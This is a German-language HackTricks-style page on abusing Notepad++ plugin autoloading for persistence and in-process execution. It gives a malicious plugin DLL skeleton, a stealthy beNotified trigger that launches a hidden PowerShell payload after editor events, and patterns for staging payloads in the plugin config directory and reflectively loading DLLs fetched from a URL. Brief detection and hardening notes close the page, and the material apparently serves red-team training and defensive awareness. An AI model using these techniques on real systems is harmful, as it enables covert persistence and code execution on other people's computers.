# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ lädt beim Start **jede Plugin-DLL automatisch**, die sich in seinen `plugins`-Unterordnern befindet. Das Ablegen eines schädlichen Plugins in einer **beschreibbaren Notepad++-Installation** ermöglicht bei jedem Start des Editors die Codeausführung innerhalb von `notepad++.exe`. Dies kann für **Persistence**, eine unauffällige **initiale Ausführung** oder als **In-Process-Loader** missbraucht werden, wenn der Editor mit erhöhten Rechten gestartet wird.<sup>[[1]](#references)</sup>

Seit **Notepad++ 7.6+** besteht die erwartete Struktur für die manuelle Installation aus **einem Unterordner pro Plugin** (`plugins\<PluginName>\<PluginName>.dll`). Im **Portable-Modus** (wenn sich `doLocalConf.xml` neben `notepad++.exe` befindet) bleibt der gesamte Anwendungsbaum lokal in diesem Verzeichnis. Dadurch werden kopierte Admin-Tool-Bundles häufig zu einer einfach beschreibbaren Ausführungsoberfläche für Benutzer.<sup>[[2]](#references)</sup>

## Beschreibbare Plugin-Speicherorte

- Standardinstallation: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (zum Schreiben sind normalerweise Administratorrechte erforderlich).<sup>[[1]](#references)</sup>
- Beschreibbare Optionen für Benutzer mit niedrigen Berechtigungen:<sup>[[1]](#references)</sup>
- Den **portablen Notepad++-Build** in einem für den Benutzer beschreibbaren Ordner verwenden.
- `C:\Program Files\Notepad++` in einen vom Benutzer kontrollierten Pfad kopieren (z. B. `%LOCALAPPDATA%\npp\`) und `notepad++.exe` von dort ausführen.
- Nach **Admin-Tool-Bundles**, extrahierten ZIP-Kopien oder Helpdesk-Toolkits suchen, die bereits `doLocalConf.xml` enthalten und sich außerhalb von `Program Files` befinden.
- Jedes Plugin erhält einen eigenen Unterordner unter `plugins` und wird beim Start automatisch geladen; Menüeinträge erscheinen unter **Plugins**.<sup>[[2]](#references)</sup>

Schnelle Triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Plugin-Ladepunkte (Ausführungsprimitive)
Notepad++ erwartet bestimmte **exportierte Funktionen**. Diese werden alle während der Initialisierung aufgerufen und bieten mehrere Ausführungsflächen:<sup>[[1]](#references)</sup>
- **`DllMain`** — wird unmittelbar beim Laden der DLL ausgeführt (erster Ausführungspunkt).
- **`setInfo(NppData)`** — wird beim Laden einmal aufgerufen, um Notepad++-Handles bereitzustellen; ein typischer Ort zum Registrieren von Menüpunkten.
- **`getName()`** — gibt den im Menü angezeigten Plugin-Namen zurück.
- **`getFuncsArray(int *nbF)`** — gibt Menübefehle zurück; selbst wenn das Array leer ist, wird die Funktion während des Starts aufgerufen.
- **`beNotified(SCNotification*)`** — empfängt Notepad++- bzw. Scintilla-Ereignisse (nützlich, um Payloads bis zu einer Benutzeraktion oder einem Editorereignis zurückzustellen).
- **`messageProc(UINT, WPARAM, LPARAM)`** — Nachrichtenhandler, nützlich für den Austausch größerer Datenmengen.
- **`isUnicode()`** — beim Laden geprüfte Kompatibilitätskennung.

Die meisten Exporte können als **Stubs** implementiert werden; die Ausführung kann aus `DllMain` oder jedem der oben genannten Callbacks während des Autoloads erfolgen.

## Minimales bösartiges Plugin-Skelett
Kompiliere eine DLL mit den erwarteten Exporten und platziere sie unter `plugins\\MyNewPlugin\\MyNewPlugin.dll` in einem beschreibbaren Notepad++-Ordner:<sup>[[1]](#references)</sup>
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Baue die DLL (Visual Studio/MinGW).
2. Erstelle den plugin-Unterordner unter `plugins` und lege die DLL dort ab.
3. Starte Notepad++ neu; die DLL wird automatisch geladen, wodurch `DllMain` und anschließend weitere Callbacks ausgeführt werden.

## Low-noise-Trigger-Muster über `beNotified`
Für OPSEC sollten viele Payloads **nicht aus `DllMain` heraus** ausgelöst werden. Ein unauffälligeres Muster besteht darin, das Plugin sauber laden zu lassen und die Ausführung erst nach einem realistischen Editor-Ereignis zu starten, etwa **abgeschlossener Start**, **Aktivierung eines Buffers** oder **das erste eingegebene Zeichen**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Dies entspricht eher öffentlich verfügbarer Offensive Research als einem auffälligen `DllMain`-Beacon: Die DLL wird beim Start weiterhin automatisch geladen, aber die bösartige Aktion wird verzögert, bis Notepad++ tatsächlich verwendet wird.

## Das Plugin-Konfigurationsverzeichnis als sekundären Speicher verwenden
Notepad++ stellt `NPPM_GETPLUGINSCONFIGDIR` bereit, das das **Plugin-Konfigurationsverzeichnis des aktuellen Benutzers** zurückgibt.<sup>[[3]](#references)</sup> Ein bösartiges Plugin kann dies verwenden, um die DLL auf dem Datenträger minimal zu halten und gleichzeitig verschlüsselte Konfigurationen, gestaffelte Payloads oder Tasking-Dateien in einem Pfad zu speichern, der sich unauffällig in den normalen Plugin-Status einfügt.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operational ist dies nützlich, wenn du Folgendes möchtest:
- eine kleine autoloaded Bootstrap-DLL;
- per-user tasking, ohne die Haupt-Plugin-Binärdatei erneut anzufassen;
- die Trennung des **autoload triggers** von der umfangreicheren zweiten Stufe.

## Reflective loader plugin pattern
Ein weaponized Plugin kann Notepad++ in einen **reflective DLL loader** verwandeln:<sup>[[1]](#references)</sup>
- Einen minimalen UI-/Menüeintrag bereitstellen (z. B. „LoadDLL“).
- Einen **file path** oder eine **URL** akzeptieren, um eine Payload-DLL abzurufen.
- Die DLL reflectively in den aktuellen Prozess mappen und einen exportierten **entry point** aufrufen (z. B. eine loader function innerhalb der abgerufenen DLL).
- Vorteil: Einen unauffällig wirkenden GUI-Prozess wiederverwenden, statt einen neuen Loader zu starten; die Payload übernimmt die Integrität von `notepad++.exe` (einschließlich elevated contexts).
- Nachteile: Das Ablegen einer **unsigned plugin DLL** auf der Festplatte ist auffällig; eine praktische Variante besteht darin, das autoloaded Plugin nur als Stub zu verwenden und das eigentliche Implant verschlüsselt bzw. staged an anderer Stelle aufzubewahren.

## Hinweise zu Detection und Hardening
- **Writes to Notepad++ plugin directories** blockieren oder überwachen (einschließlich portable Kopien in user profiles); Controlled Folder Access oder Application Allowlisting aktivieren.
- Bei **new unsigned DLLs** unter `plugins`, Änderungen an portablen Notepad++-Verzeichnisstrukturen und ungewöhnlichen **child processes/network activity** von `notepad++.exe` alarmieren.
- Legitime Plugins als Baseline erfassen und jede neue DLL untersuchen, die das normale Notepad++-Plugin-Interface exportiert, aber zusätzlich Shells, PowerShell oder Network Beacons startet.
- Die Plugin-Installation ausschließlich über **Plugins Admin** zulassen und die Ausführung portabler Kopien aus nicht vertrauenswürdigen Pfaden einschränken.

## Referenzen

- [1] [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [2] [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [3] [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
